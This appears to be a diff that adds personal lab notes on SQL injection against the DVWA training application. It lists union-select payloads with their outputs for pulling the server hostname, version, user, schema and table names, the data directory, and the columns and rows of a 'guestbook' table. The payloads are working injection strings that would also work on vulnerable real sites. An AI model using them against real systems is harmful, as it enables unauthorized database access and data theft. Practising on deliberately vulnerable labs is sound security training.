@@ -1,0 +1,45 @@
+id = ' union select @@hostname, 1 # ' == get host name
+----------------------------------------------------------------------------
+‘ union select 1,@@version#
+--------------------------------------
+‘ union select null,@@hostname #
+-------------------------------------------------
+ID:  ' union all select system_user(),user()#
+First name: app@localhost
+Surname: app@localhost
+----------------------------------------------------------------
+
+‘ union select null,database() #
+------------------------------------------------------------------
+ID: ' union select null,schema_name from information_schema.schemata#
+First name: 
+Surname: dvwa
+
+ID: ' union select null,schema_name from information_schema.schemata#
+First name: 
+Surname: information_schema
+-----------------------------------------------------
+‘ union select null,table_name from information_schema.tables #
+---------------------------------------------------------
+‘ union select null,@@datadir # //data base location
+------------------------------------------------------
+ID: id = 1'  union select column_name, null from information_schema.columns where table_name = 'guestbook'#
+First name: comment_id
+Surname: 
+
+ID: id = 1'  union select column_name, null from information_schema.columns where table_name = 'guestbook'#
+First name: comment
+Surname: 
+
+ID: id = 1'  union select column_name, null from information_schema.columns where table_name = 'guestbook'#
+First name: name
+Surname: 
+---------------------------------------------
+
+ID: id = 1' union select null, concat(comment_id,comment,name) from guestbook#
+First name: 
+Surname: 1This is a test comment.test
+
+
+
+
